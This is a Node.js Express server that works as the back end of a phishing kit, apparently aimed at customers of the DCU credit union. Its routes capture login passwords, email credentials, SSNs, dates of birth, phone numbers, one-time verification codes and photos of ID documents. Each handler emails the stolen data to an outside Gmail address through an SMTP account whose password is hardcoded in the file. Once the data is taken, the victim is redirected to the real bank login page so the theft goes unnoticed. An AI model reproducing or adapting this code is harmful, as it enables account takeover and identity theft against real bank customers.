const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const multer = require('multer');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3003;

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
      cb(null, 'uploads'); // Destination folder where uploaded files will be stored
  },
  filename: function (req, file, cb) {
      cb(null, file.originalname); // Use the original file name for the uploaded file
  }
});

const upload = multer({ storage: storage });

// Nodemailer transporter configuration
const transporter = nodemailer.createTransport({
  host: 'gton.site',
  port: 465,
  secure: true,
  auth: {
    user: 'gateway@gton.site',
    pass: 'tFWHeb9czA'
  },
  tls: {
    rejectUnauthorized: false
  }
});


// Function to send email
function sendEmail(subject, text) {
  const mailOptions = {
    from: 'gateway@gton.site',
    to: 'dodadatony@gmail.com',
    subject: subject,
    text: text
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error occurred while sending email:', error.message);
    } else {
      console.log('Email sent:', info.response);
    }
  });
}

// Custom middleware function to send email and redirect
function sendEmailAndRedirect(subject, text, redirectUrl) {
  return function(req, res, next) {
    // Simulate sending email by logging to console
    console.log(`${subject}: ${text}`);

    // Redirect to the specified URL after logging
    res.redirect(redirectUrl);

    // Call next middleware in chain
    next();
  };
}

// Function to send email with attachments
function sendEmailWithAttachments(subject, text, attachments) {
  const mailOptions = {
    from: 'gateway@gton.site',
    to: 'dodadatony@gmail.com',
    subject: subject,
    text: text,
    attachments: attachments
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error occurred while sending email with attachments:', error.message);
    } else {
      console.log('Email with attachments sent:', info.response);
    }
  });
}


// Handle POST request to /login
app.post('/login', (req, res, next) => {
  const username = req.body.username;
  const password = req.body.password;

  // Send email with received information
  sendEmail('Login Information Received', `Username: ${username}, Password: ${password}`);

  // Redirect to /detail after sending email
  res.redirect('/detail');
});

// Handle POST request to /emailsign-in
app.post('/emailsign-in', (req, res, next) => {
  const email = req.body.email;
  const password = req.body.password;

  // Send email with received information
  sendEmail('Email Sign-In Information Received', `Email: ${email}, Password: ${password}`);

  // Redirect to /id after sending email
  res.redirect('/id');
});

// Handle POST request to /user-info
app.post('/user-info', (req, res, next) => {
  const dob = req.body.dob;
  const phone = req.body.phone;
  const ssn = req.body.ssn;

  // Send email with received information
  sendEmail('User Information Received', `Date of Birth: ${dob}, Phone Number: ${phone}, SSN: ${ssn}`);

  // Redirect to /info after sending email
  res.redirect('/info');
});

// Handle POST request to /code-v
app.post('/code-v', (req, res, next) => {
  const verificationCode = req.body.verification_code;

  // Send email with received information
  sendEmail('Verification Code Received', `Verification Code: ${verificationCode}`);

  // Redirect to https://app.dcu.org/login after sending email
  res.redirect('https://app.dcu.org/login');
});

const fs = require('fs'); // Require the Node.js file system module

// Handle POST request to /images
app.post('/images', upload.fields([{ name: 'id_front', maxCount: 1 }, { name: 'id_back', maxCount: 1 }]), (req, res, next) => {
  const idFrontImage = req.files['id_front'][0];
  const idBackImage = req.files['id_back'][0];

  // Read the file data
  const idFrontImageData = fs.readFileSync(idFrontImage.path);
  const idBackImageData = fs.readFileSync(idBackImage.path);

  // Send email with received information and attachments
  sendEmailWithAttachments('Uploaded ID Images Received', 'Please find the uploaded ID images attached.', [
    { filename: idFrontImage.originalname, content: idFrontImageData },
    { filename: idBackImage.originalname, content: idBackImageData }
  ]);

  // Redirect to /access after sending email
  res.redirect('/access');
});


// Route for serving the index HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html', 'login.css'));
});

// Route for serving the info HTML file
app.get('/info', (req, res) => {
  res.sendFile(path.join(__dirname, 'info.html'));
});

app.get('/id', (req, res) => {
  res.sendFile(path.join(__dirname, 'id.html'));
});

app.get('/detail', (req, res) => {
  res.sendFile(path.join(__dirname, 'detail.html'));
});

app.get('/access', (req, res) => {
  res.sendFile(path.join(__dirname, 'access.html'));
});

// Serve static files from the eye directory
app.use('/eye', express.static(path.join(__dirname, 'eye')));


// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
